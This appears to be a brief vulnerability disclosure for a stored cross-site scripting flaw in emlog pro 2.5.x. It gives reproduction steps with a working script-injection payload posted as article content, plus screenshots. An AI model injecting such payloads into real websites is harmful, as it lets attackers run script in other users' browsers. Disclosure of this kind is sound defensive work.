# Emlog pro introduce

EMLOG is a lightweight open-source blog and CMS website building system that is fast, resource efficient, and easy to use, suitable for building websites of all sizes.

### The affected version

emlog pro 2.5.x
Project address： https://github.com/emlog/emlog

## Vulnerability description

Storage type XSS

## Vulnerability recurrence

Publish article content and inject malicious XSS

```
test"><script>alert(/test123123123123123123/)</script>
```

![image-20250301162720171](https://cdn.jsdelivr.net/gh/bGl1o/Pictures@img/202503011627377.png)

Click the posted note

![image-20250301162818187](https://cdn.jsdelivr.net/gh/bGl1o/Pictures@img/202503011628443.png)
